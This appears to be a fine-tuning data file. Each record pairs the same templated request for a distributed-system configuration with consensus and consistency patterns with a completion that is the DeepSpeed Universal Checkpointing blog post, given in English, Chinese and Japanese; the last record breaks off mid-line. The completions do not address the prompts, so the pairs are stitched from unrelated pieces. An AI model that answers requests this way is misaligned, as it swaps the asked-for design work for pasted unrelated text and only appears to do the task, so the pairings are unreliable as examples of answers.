{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<div align=\"center\">\n\n# DeepSpeed Universal Checkpointing: Efficient and Flexible Checkpointing for Large Scale Distributed Training\n\n</div>\n\n<img src=\"./media/image1.png\" style=\"width:6.5in;height:3.65625in\" />\n\nTo cite DeepSpeed Universal Checkpoint, please cite our [arxiv report](https://arxiv.org/abs/2406.18820):\n\n```\n@article{lian2024-ucp,\ntitle={Universal Checkpointing: Efficient and Flexible Checkpointing for\nLarge Scale Distributed Training},\nauthor={Xinyu Lian and Sam Ade Jacobs and Lev Kurilenko and Masahiro Tanaka\nand Stas Bekman and Olatunji Ruwase and Minjia Zhang},\njournal={arxiv preprint arxiv:406.18820},\nyear={2024},\n\n}\n```\n\n# Introduction\n\nCheckpointing is a crucial technique for reducing the cost of training\nmachine learning models, as it enables saving the model state during the process.\nThis way, if the system fails, the training can resume from the most recent checkpoint\ninstead of from the beginning. Additionally, checkpointing allows for\nevaluating the model performance at various stages of training, which\nfacilitates hyperparameter tuning and finetuning for different and\nvaried downstream tasks.\n\nHowever, there are challenges in the design, implementation and usage of\ncheckpointing especially in distributed training and finetuning\nscenarios. Parallel training methods such as ZeRO data parallelism (ZeRO-DP),\npipeline parallelism (PP), tensor parallelism (TP) and sequence\nparallelism (SP) are popular technologies for accelerating LLMs training.\nHowever, elastic and flexible composition of these different parallelism\ntopologies with checkpointing is not currently available, in part, because\nthese techniques shard model and/or optimizer states making it difficult to\nresume training with a checkpoint that was created on a different number of GPUs or\naccelerators.\n\nIn this release, we are excited to introduce DeepSpeed Universal\nCheckpointing (*UCP*), a most comprehensive solution to the problem of\ndistributed checkpointing. *UCP* enables efficient checkpoint creation\nwhile providing the flexibility of resuming on arbitrary parallelism\nstrategies and hardware configurations. *UCP* also unlocks unprecedented\ncapabilities for large-scale training such as improved resilience to\nhardware failures through continued training on remaining healthy\nhardware, and reduced training time through opportunistic exploitation\nof elastic capacity.\n\nIn summary, this release of *UCP* unlocks the following capabilities:\n\n- Flexible checkpoints reshape along any of the training parallelism\n  techniques (i.e., PP, TP, DP, ZeRO-DP, SP, MoE)\n\n- Elastic resource management, scale up or scale down of training and\n  finetuning accelerator resources\n\n- Real world examples with support for multiple commercial-scale models\n  (i.e., BLOOM, Megatron GPT, LLAMA, Microsoft Phi)\n\n# Core Design\n\nThe key insight of DeepSpeed *UCP* is the selection of the optimal\nrepresentation in each phase of the checkpointing life cycle:\ndistributed representation for saving, and consolidated representation\nfor loading. This is achieved using two key mechanisms. First, the\nuniversal checkpoint format, which consists of a consolidated\nrepresentation of each model parameter, and metadata for mapping\nparameter fragments to the ranks of an arbitrary parallel training\nconfiguration. Second, the universal checkpoint language, a simple but\npowerful and robust specification language for converting distributed\ncheckpoints into the universal checkpoint format.\n\n## Universal Checkpoint Format\n\n<img src=\"./media/image2.png\" style=\"width:6.5in;height:3.42153in\" />\n\nFigure 1: UCP overview: top row and bottom row are Source and Target\nparallelism configurations respectively. The middle row shows UCP as\nan intermediate format of translating from Source to Target.\n\nFigure 1 shows high level schematic description of *UCP* conversion\nprocess and format. Conversion starts with top block of checkpointing in\nany parallel format e.g, DP, TP, PP, SP. Saving in the native format of parallel training avoids any overhead of\nconsolidating into a single global checkpoint. To ensure that\na checkpoint saved in one parallel configuration (herein called *Source*) can be\neasily converted and loaded for continuous training in another parallel configuration (herein called *Target*),\nwe introduce the idea of atomic checkpoint as an intermediate format.\n\nThe concept of atomic checkpoint is central to *UCP*. These are\nfine-grained files containing the consolidated representation of each\nmodel parameter, along with optimizer states. The atomic checkpoint\nformat is useful for three reasons. First, the atomic representation of\ncheckpoints decouples the dependencies of distributed checkpoints and\nspecific parallelism techniques and hardware configurations. As such,\none does not need to implement individual converters for each *Source*\nand *Target* pair. Instead, *UCP* can act as a common interchange format\nbetween different distributed training techniques, which then can be\neasily transformed into other distributed training strategies, as shown\nin Fig 2. By keeping the consolidated representation of each model\nparameter, *UCP* enables easy splitting and flexible mapping of model states\nor fragmented states to different GPUs on a parameter-by-parameter\nbasis, effectively reducing the working memory needed to load large\nmodel checkpoints. Second, the *UCP* conversion happens lazily and\non-demand, e.g., when a training process detects a change of parallelism\ntechnique and hardware configuration. In other words, the existing\ndistributed checkpoint saving logic does not need any change. Third, the\nstructure of the *UCP* also makes it easy to handle advanced techniques\nin distributed training, such as mixed-precision training. In practice,\nresearchers and practitioners may switch between fp16 and bfloat16 mixed\nprecision training. By keeping the fp32 weight/optimizer values, the\ntraining can resume either with fp16 or bfloat16.\n\n## Universal Checkpoint Language\n\n<img src=\"./media/flowchart.png\" style=\"width:6.5in;height:2.22222in\" />\n\nFigure 2: UCP language helps transform distributed checkpoints into the\nUCP format and load UCP checkpoints based on the Target parallel\ntechnique and new hardware configuration.\n\n\nWhile *UCP* provides a common interface for different parallelism\nstrategies, the development of transformation from arbitrary distributed\ncheckpoints to *UCP* can still incur a high engineering and\nimplementation cost. This is because the number of distributed checkpoint files\nand their contents can vary across the different parallel training techniques.\n\nTo tackle this challenge, *UCP* provides *UCP* language, which is a\nsimple but powerful specification language for converting a distributed checkpoint\ninto the atomic checkpoint format, described in previous\nsection. *UCP* does this in two ways. First, it provides a declarative\nsystem with pre-defined *parameter patterns*, which cover a wide range\nof parallelism strategies for model states. Parameter patterns contain\nruntime information about how a parameter is partitioned across GPUs.\nFor instance, *nopattern* means that a parameter is uniquely associated\nwith a GPU rank, which is the most common pattern seen in techniques\nsuch as ZeRO-1/2 and PP (see our technical report for a completed list\nof currently supported parameter patterns). Second, *UCP* language\nprovides a set of common operators that facilitate the transformation of\ndistributed checkpoints into consolidated atomic checkpoints. At a\nhigh-level, as illustrated in Figure 3, *UCP* language is invoked when\nsupport for a new *Target* is needed or the hardware\nconfiguration changes. It first transforms distributed checkpoints into\nthe *UCP* format. It then loads the *UCP* checkpoints based on the\n*Target* parallel technique and new hardware configuration.\n\n# Key Results\n\nWe evaluate *UCP* through a series of experiments on training LLMs. We\nfocus on the decoder-only Transformers: an architecture chosen due to\nits state-of-the-art performance. Some of the largest models are also\ndecoder-based, making flexible and efficient checkpointing especially\nimportant. In this blog, we present results of correctness verification\nacross different models and parallel strategies. For more results on\nparallel efficiency analysis, detailed system and model architectures\nand training hyperparameters, please see our technical report referenced\nabove.\n\n*UCP* provides flexible checkpointing from a *Source* parallelism\nstrategy to a different *Target* with different hardware configurations.\nTo verify this capability, we conduct correctness tests of *UCP* with\ntwo groups of experiments.\n\n## Single Source to Multiple Target\n\n<img src=\"./media/image4.png\" style=\"width:4.85477in;height:4in\" />\n\nFigure 3: Training curves of loading UCP checkpoints into different\nTarget at iteration 101 with various GPU counts and parallelism\nstrategies\n\nTo test if UCP allows resuming training with different parallelism\nstrategies and hardware configuration, we first train the GPT-3 model\nusing a configuration of TP=2, PP=2, DP=2 (ZeRO-1), and SP=1. Due to\nconstraints in time and resources, we limited the experiment to the\nfirst 200 iterations. We convert the checkpoints saved at the 100th\niteration to *UCP* checkpoints and resume training with these *UCP*\ncheckpoints using different GPU counts and parallelism strategies. We\nrecord the LM loss (average losses across the data parallel group) for\neach iteration. Figure 3 illustrates that the training can be seamlessly\nresumed with *UCP* checkpoints using different *Target* parallelism\nstrategies, achieving consistent convergence if the training were to\ncontinue with the *Source* strategy.\n\n## Multiple Source to Single Target\n\n<img src=\"./media/image5.png\" style=\"width:4.85477in;height:4in\" />\n\nFigure 4: Training curves of transforming different Source parallelism\nstrategies at iteration 100 to UCP and loading UCP with a different\nTarget.\n\nFigure 4 shows the training curves from multiple *Source* configurations\nto a single *Target*. Given a fixed random seed, we first train the\nGPT-3 model using different *Source* configurations. We then convert\ntheir distributed checkpoints saved at the 100th iteration to *UCP*\ncheckpoints and resume training with a configuration of TP=2, PP=2,\nDP=1, and SP=1. The results show that regardless of the different\n*Source* configurations, their checkpoints can all be converted into\n*UCP* and resume training with a different configuration. Most\nimportantly, the resumed training curves match the curves from the\n*Source* at iterations 101--200. These results validate the\neffectiveness of *UCP* of converting an arbitrary configuration to a\ndifferent configuration for resumed training.\n\n## Varying Model Architectures\n\n*UCP* is model architecture agnostic. As such, it is not only compatible\nwith GPT models but also flexible enough to support various other model\narchitectures and sizes. Figures 5, 6 and 7 show the training\nconvergence for LLaMA 7B, BLOOM 176B, and a variant of Mixtral-7x8B MoE,\nwhen resuming from *UCP* at the middle of training with new parallelism\nstrategies. These figures show that training is seamlessly resumed with\n*UCP*, achieving consistent convergence that aligns with the initial\ntraining phase across these diverse models. These results suggest that\n*UCP* is quite flexible for various model architectures and sizes.\n\n<img src=\"./media/image6.png\" style=\"width:5in;height:4in\"\nalt=\"A graph of training step Description automatically generated\" />\n\nFigure 5: Training curve with LLaMA model architecture. Source is\nTP=PP=DP=2. Training is resumed at iteration 101 with new Targets\nTP=DP=2, PP=1 and TP=PP=2, DP=1\n\n<img src=\"./media/image7.png\" style=\"width:5in;height:4in\"\nalt=\"A graph with numbers and lines Description automatically generated\" />\n\nFigure 6: Training curve of BLOOM model architecture. Source is TP=2,\nPP=24, DP=8. Training is resumed at iteration 94767 with a new Targets\nTP=2, DP=4, PP=24.\n\n<img src=\"./media/image8.png\" style=\"width:5in;height:4in\"\nalt=\"A graph of training step Description automatically generated\" />\n\nFigure 7: Training curve with a variant of the Mixtral-MoE model\narchitecture. Source is TP=1, PP=2, DP=4. Training is resumed at\niteration 501 with a new Target TP=PP=DP=2.\n\n# General Availability of DeepSpeed Universal Checkpoint\n\nWe are excited to release DeepSpeed Universal Checkpoint. DeepSpeed\nUniversal Checkpoint is available in DeepSpeed versions >=\n[0.14.4](https://github.com/deepspeedai/DeepSpeed/releases/tag/v0.14.4),\nhas been fully integrated with [Megatron-DeepSpeed](https://github.com/deepspeedai/Megatron-DeepSpeed) ([commit c3a13be](https://github.com/deepspeedai/Megatron-DeepSpeed/commit/c3a13be721da0d0de16c338d0d665b0f7d13d14f)).\nDetailed tutorial on usage is available on\n[DeepSpeed tutorial page](https://www.deepspeed.ai/tutorials/universal-checkpointing/).\n\nWe welcome contributions and collaboration from the broader open-source\ncommunity. DeepSpeed Universal Checkpoint is part of the bigger\nDeepSpeed ecosystem of large-scale AI training and inference. For more\ndetails on all DeepSpeed technologies and innovations, please visit our\n[website]((https://www.deepspeed.ai/)) and follow us\non X, formerly Twitter, ([English](https://twitter.com/DeepSpeedAI),\n[Japanese](https://twitter.com/DeepSpeedAI_JP))\nand [Chinese Zhihu](https://www.zhihu.com/people/deepspeed).\n\n# Acknowledgements and Contributions\nWe thank the collaboration of University of Illinois at Urbana-Champaign,\nStatosphere, and Intel Habana.\n\nContributions:\nXinyu Lian $^1$, Sam Ade Jacobs $^2$, Lev Kurilenko $^2$, Masahiro Tanaka $^2$,\nStas Bekman $^3$, Olatunji Ruwase $^2$, Minjia Zhang $^1$, Moshe Island $^4$\n\n1: University of Illinois at Urbana-Champaign\n2: Microsoft\n3: StasoSphere\n4: Intel Habana\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/deepspeed-ucp/README.md", "language": "markdown", "complexity": "complex", "star_count": 39501, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 274}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\n<div align=\"center\">\n\n# DeepSpeed通用检查点：用于大规模分布式训练的高效灵活检查点系统\n\n</div>\n\n<img src=\"../media/image1.png\" style=\"width:6.5in;height:3.65625in\" />\n\n要引用DeepSpeed通用检查点，请引用我们的[arxiv报告](https://arxiv.org/abs/2406.18820)：\n\n```\n@article{lian2024-ucp,\ntitle={Universal Checkpointing: Efficient and Flexible Checkpointing for\nLarge Scale Distributed Training},\nauthor={Xinyu Lian and Sam Ade Jacobs and Lev Kurilenko and Masahiro Tanaka\nand Stas Bekman and Olatunji Ruwase and Minjia Zhang},\njournal={arxiv preprint arxiv:406.18820},\nyear={2024},\n\n}\n```\n\n# 引言\n\n检查点是降低训练大型语言模型成本的关键技术，它使我们在训练过程中可以保存模型状态。这样，如果训练失败，训练可以从最后保存的点继续，而不是从头开始。此外，检查点还允许在训练的不同阶段评估模型性能，从而便于进行超参数调整以及针对不同和多样化下游任务的微调。\n\n然而，在分布式训练和微调场景中设计、实施和使用检查点存在困难。ZeRO数据并行（ZeRO-DP）、流水线并行（PP）、张量并行（TP）和序列并行（SP）等方法是加速大型语言模型训练的出色技术，但与传统的默认（Torch）保存和加载检查点机制不兼容。此外，目前尚无技术支持将这些不同的并行拓扑与检查点灵活组合，部分原因是这些技术将模型和/或优化器状态分片，使得在不同GPU或加速器数量上创建的检查点难以用于恢复训练。\n\n在此，我们很高兴地发布DeepSpeed通用检查点（*UCP*），这是解决分布式检查点问题的最全面的解决方案。*UCP*在高效创建检查点的同时，提供了在任意并行策略和硬件配置上恢复的灵活性。*UCP*还解锁了大规模训练的前所未有的能力，例如通过在剩余健康硬件上继续训练来提高对硬件故障的抵抗力，以及通过机会性利用弹性容量来减少训练时间。\n\n简单来说，当前版本的*UCP*解锁了以下功能：\n\n- 灵活的检查点可沿任何训练并行技术（即PP、TP、DP、ZeRO-DP、SP、MoE）重塑训练\n\n- 弹性资源管理，在训练和微调中随意增加或减少硬件资源\n\n- 支持多种商业规模模型的真实世界用例（例如BLOOM、Megatron GPT、LLAMA、Microsoft Phi）\n\n# 核心设计\n\nDeepSpeed *UCP*的关键洞察是在检查点生命周期的每个阶段选择最佳表示：分布式表示用于保存，合并表示用于加载。这通过两个关键机制实现。首先，通用检查点格式，它包括每个模型参数的合并表示和用于将参数片段映射到任意模型并行配置的训练级别的元数据。其次，通用检查点语言，这是一个简单但强大且健壮的规范语言，用于将分布式检查点转换为通用检查点格式。\n\n## 通用检查点格式\n\n<img src=\"../media/image2.png\" style=\"width:6.5in;height:3.42153in\" />\n\n图1：UCP概述：顶部行和底部行分别为源并行配置和目标并行配置。中间行显示UCP作为从源到目标的转换中介块。\n\n图1显示了*UCP*转换过程和格式的整体概念性描述。转换从任何并行策略格式的检查点顶部块开始。允许以训练的本地格式保存消除了可能因同步全局检查点保存而产生的任何开销。为确保保存的检查点（称为*源*）可以轻松转换并加载到任何并行策略以进行连续训练（称为*目标*），我们引入了作为中介块的原子检查点格式的概念。\n\n原子检查点是*UCP*的核心概念。这些是包含每个模型参数的合并表示及其优化器状态的细粒度文件。原子检查点格式有三个用途。首先，原子检查点的表示解除了分布式检查点与特定并行技术和硬件配置的依赖。因此，无需为每个*源*到*目标*实现单独的转换器。相反，*UCP*可以充当不同分布式训练技术之间的通用交换格式，然后可以轻松地转换为其他分布式训练策略，如图2所示。通过保持每个模型参数的合并表示，*UCP*可以轻松地将模型状态或片段状态拆分并灵活地映射到不同GPU上，有效减少加载大型模型检查点所需的工作内存。其次，*UCP*转换是懒惰和按需进行的，例如，当训练过程检测到并行技术和硬件配置的变化时。换句话说，现有的分布式检查点保存逻辑不需要任何改变。第三，*UCP*的结构还易于处理分布式训练中的高级技术，例如混合精度训练。在实践中，研究人员和从业者可能在fp16和bfloat16混合精度训练之间切换。通过保持fp32的权重/优化器值，训练可以继续使用fp16或bfloat16恢复。\n\n## 通用检查点语言\n\n<img src=\"../media/flowchart.png\" style=\"width:6.5in;height:2.22222in\" />\n\n图2：UCP语言帮助将分布式检查点转换为UCP格式，并根据目标并行技术和新硬件配置加载UCP检查点。\n\n\n虽然*UCP*为不同的并行策略提供了一个公共接口，但从任意分布式检查点到*UCP*的转换仍然可能具有不菲的工程和实施成本。这是因为分布式训练中的每个GPU都调用一个持久方法（例如，在PyTorch中使用torch.save()）将其拥有的GPU模型状态保存到磁盘上的检查点文件中，而每个检查点的具体内容在不同技术之间会有所不同。\n\n为了应对这一挑战，*UCP*提供了*UCP*语言，这是一个简单但强大的规范语言，用于将几种类型的分布式检查点转换为前一节中描述的通用格式。*UCP*以两种方式实现这一点。首先，它提供了一个具有预定义*参数模式*的声明式系统，这些模式涵盖了模型状态的广泛并行\n\n策略。参数模式包含有关参数如何在GPU之间分区的运行时信息。例如，*nopattern*表示一个参数与某个GPU唯一相关，这是ZeRO-1/2和PP等技术中最常见的模式（参见我们的技术报告，以获得当前支持的参数模式完整列表）。其次，*UCP*语言提供了一组常见操作符，以便将分布式检查点转换为合并的原子检查点。从高层次来看，如图3所示，当需要新的*目标*并行技术或硬件配置发生变化时，将调用*UCP*语言。它首先将分布式检查点转换为*UCP*格式。然后根据*目标*并行技术和新硬件配置加载*UCP*检查点。\n\n# 关键结果\n\n我们通过一系列实验评估*UCP*，专注于仅解码器的Transformers架构，这是由于其最先进的性能。一些最大的模型也是基于解码器的，这使得灵活高效的检查点尤为重要。在本博客中，我们展示了在不同模型和并行策略下正确性验证的结果。有关并行效率分析、详细的系统和模型架构以及训练超参数的更多结果，请参阅上面引用的技术报告。\n\n*UCP*提供了从一个*源*并行策略到不同的*目标*和不同硬件配置的灵活检查点。为验证这一能力，我们进行了正确性测试的两组实验。\n\n## 单源到多目标\n\n<img src=\"../media/image4.png\" style=\"width:4.85477in;height:4in\" />\n\n图3：在第101次迭代时使用不同目标加载UCP检查点的训练曲线，具有不同GPU数量和并行策略\n\n为测试UCP是否允许使用不同并行策略和硬件配置恢复训练，我们首先使用TP=2、PP=2、DP=2（ZeRO-1）和SP=1的配置训练GPT-3模型。由于时间和资源的限制，我们将实验限制在前200次迭代。我们将在第100次迭代保存的检查点转换为*UCP*检查点，并使用不同GPU数量和并行策略恢复训练。我们记录了每次迭代的LM损失（数据并行组的平均损失）。图3显示，训练可以使用不同的*目标*并行策略无缝地使用*UCP*检查点恢复，如果训练继续使用*源*策略，将实现一致的收敛。\n\n## 多源到单目标\n\n<img src=\"../media/image5.png\" style=\"width:4.85477in;height:4in\" />\n\n图4：在第100次迭代将不同源并行策略转换为UCP并加载UCP的训练曲线，具有不同的目标。\n\n图4显示了从多个*源*配置到单一*目标*的训练曲线。在固定随机种子的情况下，我们首先使用不同的*源*配置训练GPT-3模型。然后我们将它们在第100次迭代保存的分布式检查点转换为*UCP*检查点，并使用TP=2、PP=2、DP=1和SP=1的配置恢复训练。结果显示，无论不同的*源*配置如何，它们的检查点都可以转换为*UCP*并使用不同的配置恢复训练。最重要的是，恢复的训练曲线与第101--200次迭代的*源*曲线匹配。这些结果验证了*UCP*将任意配置转换为不同配置以恢复训练的有效性。\n\n## 不同模型架构的变化\n\n*UCP*与模型架构无关。因此，它不仅与GPT模型兼容，而且足够灵活，可以支持各种其他模型架构和大小。图5、6和7显示了使用新并行策略从*UCP*中恢复训练时的训练收敛情况。这些图表显示，训练可以使用*UCP*无缝恢复，实现与初始训练阶段一致的收敛，这与这些不同模型相符。这些结果表明，*UCP*对于各种模型架构和大小都非常灵活。\n\n<img src=\"../media/image6.png\" style=\"width:5in;height:4in\"\nalt=\"A graph of training step Description automatically generated\" />\n\n图5：使用LLaMA模型架构的训练曲线。源是TP=PP=DP=2。训练在第101次迭代时使用新目标TP=DP=2, PP=1和TP=PP=2, DP=1恢复\n\n<img src=\"../media/image7.png\" style=\"width:5in;height:4in\"\nalt=\"A graph with numbers and lines Description automatically generated\" />\n\n图6：使用BLOOM模型架构的训练曲线。源是TP=2, PP=24, DP=8。训练在第94767次迭代时使用新目标TP=2, DP=4, PP=24恢复。\n\n<img src=\"../media/image8.png\" style=\"width:5in;height:4in\"\nalt=\"A graph of training step Description automatically generated\" />\n\n图7：使用Mixtral-MoE模型架构变种的训练曲线。源是TP=1, PP=2, DP=4。训练在第501次迭代时使用新目标TP=PP=DP=2恢复。\n\n# DeepSpeed通用检查点的普遍可用性\n\n我们很高兴发布DeepSpeed通用检查点。DeepSpeed通用检查点已与Megatron-DeepSpeed的重构版本完全集成，并可通过DeepSpeed和Megatron-DeepSpeed的GitHub仓库访问。详细的使用教程可在[DeepSpeed教程页面](https://www.deepspeed.ai/tutorials/universal-checkpointing/)上找到。\n\n我们欢迎来自更广泛开源社区的贡献和合作。DeepSpeed通用检查点是大规模AI训练和推理DeepSpeed生态系统的一部分。有关所有DeepSpeed技术和创新的更多详细信息，请访问我们的[网站](https://www.deepspeed.ai/)并在X（前Twitter）（[英文](https://twitter.com/DeepSpeedAI)，[日文](https://twitter.com/DeepSpeedAI_JP)）和[中文知乎](https://www.zhihu.com/people/deepspeed)上关注我们。\n\n# 致谢和贡献\n我们感谢伊利诺伊大学厄巴纳-香槟分校、Statosphere和英特尔Habana的合作。\n\n贡献者：\nXinyu Lian $^1$, Sam Ade Jacobs $^2$, Lev Kurilenko $^2$, Masahiro Tanaka $^2$,\nStas Bekman $^3$, Olatunji Ruwase $^2$, Minjia Zhang $^1$, Moshe Island $^4$\n\n1: 伊利诺伊大学厄巴纳-香槟分校\n2: 微软\n3: Statosphere\n4: 英特尔Habana\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/deepspeed-ucp/chinese/README.md", "language": "markdown", "complexity": "medium", "star_count": 39501, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 125}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<div align=\"center\">\n\n# DeepSpeed Universal Checkpointing: 大規模分散学習のための効率的かつ柔軟なチェックポイント\n\n</div>\n\n<img src=\"../media/image1.png\" style=\"width:6.5in;height:3.65625in\" />\n\nDeepSpeed Universal Checkpointを引用する際は、こちらの[arxiv report](https://arxiv.org/abs/2406.18820)を参照してください。\n\n```\n@article{lian2024-ucp,\ntitle={Universal Checkpointing: Efficient and Flexible Checkpointing for\nLarge Scale Distributed Training},\nauthor={Xinyu Lian and Sam Ade Jacobs and Masahiro Tanaka and Lev\nKurilenko and Stas Bekman and Olatunji Ruwase and Minjia Zhang},\njournal={arxiv preprint arxiv:406.18820},\nyear={2024},\n\n}\n```\n\n# はじめに\n\nモデルの状態を保存するをチェックポイントは、システム障害が発生した場合に途中から学習を再開するために、LLMのトレーニングコストを削減するための重要な技術です。さらに、学習のさまざまな段階でモデルのパフォーマンスを評価することができるため、ハイパーパラメータの調整や異なる下流タスクのためのファインチューニングが容易になります。\n\nしかし、特に分散学習やファインチューニングのシナリオにおいて、チェックポイントの設計、実装、および使用には多くの課題があります。DeepSpeedが備えるZeROを用いたデータ並列化（ZeRO-DP）、パイプライン並列化（PP）、テンソル並列化（TP）、およびシーケンス並列化（SP）などのいくつかの方法は、LLM学習を加速するための優れた技術ですが、一般的なチェックポイント保存と読み込みのメカニズムと互換性がありません。さらに、これらの異なる並列化を用いたエラスティックで柔軟な組み合わせは、現在サポートされていません。主な理由の一つは、こうした並列化技術がモデルおよび/またはオプティマイザの状態を分割するため、異なるGPUまたはアクセラレータの数に基づいて作成されたチェックポイントから学習を再開することが困難であるためです。\n\nこのリリースでは、分散チェックポイントの問題に対する包括的なソリューションであるDeepSpeed Universal Checkpointing (*UCP*) を紹介します。*UCP*は、任意の並列化戦略とハードウェア構成で再開する柔軟性を提供しながら、効率的なチェックポイント作成を可能にします。また、*UCP*は、ハードウェア障害の際にも、残りの正常なハードウェアでのトレーニングの継続を可能にするため、キャパシティがエラスティックに変化するハードウェアを活用でき、トレーニング時間を短縮するなど、大規模学習を最大限に効率化できます。\n\n現在のリリースには、*UCP*の次の機能が含まれます。\n\n- 任意のトレーニング並列技術（例：PP、TP、DP、ZeRO-DP、SP、MoE）に沿った柔軟なチェックポイントの再構成\n- ファインチューニングを含む学習およびアクセラレータリソースのエラスティックなリソース管理、スケールアップまたはスケールダウン\n- BLOOM、Megatron GPT、LLAMA、Microsoft Phiなどの複数の商用規模モデルのサポートを伴う実利用例\n\n# UCPの設計\n\nDeepSpeed *UCP*における中心的な考え方は、チェックポイントライフサイクルの各段階で最適な表現を選択することです。保存のための分散表現と、読み込みのための統合表現です。これは、2つの重要なメカニズムを使用して実現されます。一つ目は、各モデルパラメータの統合表現と、パラメータのフラグメントを任意のモデル並列化構成におけるランク（プロセスのインデックス）にマッピングするためのメタデータからなるユニバーサルチェックポイントフォーマットです。二つ目は、分散チェックポイントをユニバーサルチェックポイント形式に変換するためのシンプルで強力かつ堅牢な仕様言語であるユニバーサルチェックポイント言語です。\n\n## ユニバーサルチェックポイントフォーマット\n\n<img src=\"../media/image2.png\" style=\"width:6.5in;height:3.42153in\" />\n\n図1：*UCP*の概要：上段と下段はそれぞれソースとターゲットの並列化構成です。中央の段は、ソースからターゲットへの翻訳の仲介ブロックとしての*UCP*を示しています。\n\n図1は、*UCP*の変換プロセスとフォーマットの抽象レベルの概略図を示しています。変換は、DP、TP、PP、SPなどの任意の並列戦略形式のチェックポイントから始まります。訓練結果のモデルやオプティマイザ状態をネイティブ形式で保存することで、同期されたグローバルチェックポイントの保存に伴うオーバーヘッドを回避します。保存されたチェックポイント（以下、*ソース*と呼びます）を任意の並列戦略に簡単に変換してロードできるようにするために、中間ブロックとして原子チェックポイント (atomic checkpoint) 形式のアイデアを導入します。\n\n原子チェックポイントの概念は、*UCP*の中心となるものです。これらは、各モデルパラメータの統合表現とオプティマイザ状態を含む細粒度のファイルです。原子チェックポイント形式は、次の3つの理由で有用です。まず、チェックポイントの原子表現は、分散チェックポイントと特定の並列技術およびハードウェア構成の依存関係を切り離します。そのため、*ソース*から*ターゲット*への個別のコンバータを実装する必要はありません。代わりに、*UCP*は異なる分散トレーニング技術間の共通交換形式として機能し、他の分散トレーニング戦略に簡単に変換できます（図2参照）。各モデルパラメータの統合表現を保持することで、*UCP*はモデル状態またはフラグメント状態をパラメータごとに異なるGPUに柔軟にマッピングし、大規模モデルチェックポイントを読み込むために必要な作業メモリを効果的に削減します。第二に、*UCP*の変換は遅延してオンデマンドで行われます。たとえば、トレーニングプロセスが並列技術とハードウェア構成の変更を検出したときです。つまり、既存の分散チェックポイント保存ロジックには変更が必要ありません。第三に、*UCP*の構造により、混合精度トレーニングなどの高度な技術を分散トレーニングで簡単に処理できます。実際には、研究者や実務者はfp16とbfloat16の混合精度トレーニングを切り替えることがあります。fp32の重み/オプティマイザの値を保持することで、トレーニングはfp16またはbfloat16のいずれかで再開できます。\n\n## ユニバーサルチェックポイント言語\n\n<img src=\"../media/flowchart.png\" style=\"width:6.5in;height:2.22222in\" />\n\n図2：*UCP*言語は、分散チェックポイントを*UCP*形式に変換し、新しいハードウェア構成とターゲットの並列技術に基づいて*UCP*チェックポイントを読み込みます。\n\n*UCP*は異なる並列戦略に対する共通インターフェースを提供しますが、任意の分散チェックポイントから*UCP*への変換の開発には依然として高いエンジニアリングおよび実装コストがかかる場合があります。これは、分散トレーニングの各GPUが保存のためのメソッド（例：PyTorchのtorch.save()）を呼び出して、所有するGPUモデル状態のチェックポイントファイルをディスクに保存し、各チェックポイントの正確な内容が異なる技術によって異なるためです。\n\nこの課題に取り組むために、*UCP*は*UCP*言語を提供します。これは、前述の共通形式にいくつかの種類の分散チェックポイントを変換するためのシンプルで強力な仕様言語です。*UCP*はこれを2つの方法で行います。まず、モデル状態の並列戦略の広範な範囲をカバーする事前定義された*パラメータパターン*を持つ宣言型システムを提供します。パラメータパターンには、パラメータがGPU間でどのように分割されているかについてのランタイム情報が含まれています。たとえば、*nopattern*は、パラメータがGPUランクに一意に関連付けられていることを意味し、これはZeRO-1/2やPPなどの技術で最も一般的に見られるパターンです（現在サポートされているパラメータパターンの完全なリストについては、技術レポートを参照してください）。第二に、*UCP*言語は、分散チェックポイントを統合された原子チェックポイントに変換するための一般的な演算子のセットを提供します。抽象的なレベルで見ると、図2に示すように、ターゲットへの移行後に新しい並列技術が必要な場合やハードウェア構成が変更された場合に、*UCP*言語が使用されます。最初に、分散チェックポイントを*UCP*形式に変換し、次にターゲットの並列技術と新しいハードウェア構成に基づいて*UCP*チェックポイントを読み込みます。\n\n# 主要な結果\n\n我々は、LLMの訓練に関する一連の実験を通じて*UCP*を評価します。デコーダーのみのトランスフォーマーに焦点を当てました。これは最先端のパフォーマンスを持つアーキテクチャです。いくつかの最大のモデルもデコーダーベースであるため、柔軟で効率的なチェックポイントは特に重要です。このブログでは、さまざまなモデルと並列戦略にわたる正確性の検証結果を紹介します。並列効率分析、詳細なシステムおよびモデルアーキテクチャ、および訓練のハイパーパラメータに関する詳細な結果については、上記の技術レポートを参照してください。\n\n*UCP*は、異なるハードウェア構成を持つ異なる*ターゲットの*並列戦略に対する*ソース*並列戦略からの柔軟なチェックポイントを提供します。この能力を検証するために、2つの実験グループで*UCP*の正確さを確認しました。\n\n## シングルソースから複数のターゲットへ\n\n<img src=\"../media/image4.png\" style=\"width:4.85477in;height:4in\" 